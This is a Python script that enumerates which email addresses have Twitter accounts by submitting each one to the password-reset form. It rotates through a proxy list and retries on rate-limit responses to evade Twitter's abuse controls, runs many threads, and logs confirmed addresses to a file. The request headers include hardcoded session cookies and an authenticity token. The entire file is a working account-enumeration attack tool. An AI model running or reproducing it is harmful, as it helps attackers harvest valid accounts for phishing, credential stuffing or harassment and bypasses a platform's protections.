import requests
import threading
import time
import os
import sys

proxied = True
found_yet = False
proxies = [_.strip() for _ in open('proxies.txt').readlines()]
emails = [e.strip() for e in open('emails.txt').readlines()]
incorrect_count = 0
correct_count = 0


def tick():
    s1z3 = len(emails)
    while True:
        print(f'unmade: {incorrect_count}/{s1z3} ... made: {correct_count}', end='\r')
        if len(emails) == 0:
            break

        time.sleep(.25)

    os.system('cls||clear')
    print(f'Done checking! {correct_count} emails are taken out of the {s1z3} checked.')
    time.sleep(1)


def start_thread():
    while len(emails) > 0:
        email = emails.pop()
        try_email(email)


def try_email(email):
    global incorrect_count
    global correct_count
    global found_yet
    global proxies
    global emails

    s = requests.Session()
    if proxied:
        if len(proxies) > 0:
            p = proxies.pop()
            proxy_dict = {
                "http":f"http://{p}",
                "https":f"https://{p}"
            }
            s.proxies=proxy_dict
        else:
            proxies = [_.strip() for _ in open('proxies.txt').readlines()]
            p = proxies.pop()
            proxy_dict = {
                "http":f"http://{p}",
                "https":f"https://{p}"
            }
            s.proxies=proxy_dict


    headers = {
    'authority': 'twitter.com',
    'cache-control': 'max-age=0',
    'upgrade-insecure-requests': '1',
    'origin': 'https://twitter.com',
    'content-type': 'application/x-www-form-urlencoded',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'sec-fetch-dest': 'document',
    'referer': 'https://twitter.com/account/begin_password_reset',
    'accept-language': 'en-US,en;q=0.9',
    'cookie': '_sl=1; gt=1430567702033272832; G_ENABLED_IDPS=google; kdt=0Z4CP7H1zse0prwYcSYv5XMA2AY5B53Wt7IRdpwJ; dnt=1; ct0=23cc6930e0eaf8971e896310f69d906e; personalization_id="v1_0JMD1kNEmGh5IAkvHlYEjw=="; guest_id=v1%3A162991118585931139; att=1-TMsq9lpgFUk3vPyNaCO4XXcuZxe67PZCKNgzyEUF; _twitter_sess=BAh7DiIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCNY8R357AToMY3NyZl9p%250AZCIlODg0YzVhYWEwNzY0OGI2NzEzMDg4NGU4YjQ4YjA0NGU6B2lkIiUzNGE1%250AMTFlNTczZGM5NTAzOTIwYTMxNjY4MTMwNGQ3ZSIJcHJycCIAOghwcnNpCDoI%250AcHJ1aQTRrzASOghwcmlpBzoIcHJwbCsHOXomYQ%253D%253D--fc807953ac722164b8c36b50dfee044b583cfa99',
    'sec-gpc': '1',
    }

    data = {
      'authenticity_token': 'd1f44b0a4f9d2e29024401465032c56198747384',
      'account_identifier': f'{email}'
    }

    try:
        r1 = s.post('https://twitter.com/account/begin_password_reset', headers=headers, data=data)
        cont = str(r1.content)

        if "Please try again later" not in cont:
            # if there is no email protection:
            if "How do you want to reset your password?" in cont:
                exists = open('exists.txt', 'a')
                exists.write(f'{email} exists\n')
                exists.close()
                correct_count += 1

            # if there is email protection:
            if "Enter your username to continue" in cont:
                exists = open('exists.txt', 'a')
                exists.write(f'{email} exists\n')
                exists.close()
                correct_count += 1

            else:
                incorrect_count += 1

        else:
            try_email(email)

    except:
        # usually you catch an exception here when
        # the proxy is dead so it retries
        # on a new one
        try_email(email)


if __name__ == "__main__":
    threads = []
    threading.Thread(target=tick).start() # console ticker thread
    
    if len(sys.argv) > 1:
        thread_count = int(sys.argv[1]) # thread count taken from console, if no arg then default 10
    else:
        thread_count = 10
    
    for i in range(thread_count):
        threads.append(threading.Thread(target=start_thread))

    for j in range(thread_count):
        threads[j].start()

    for k in range(thread_count):
        threads[k].join()
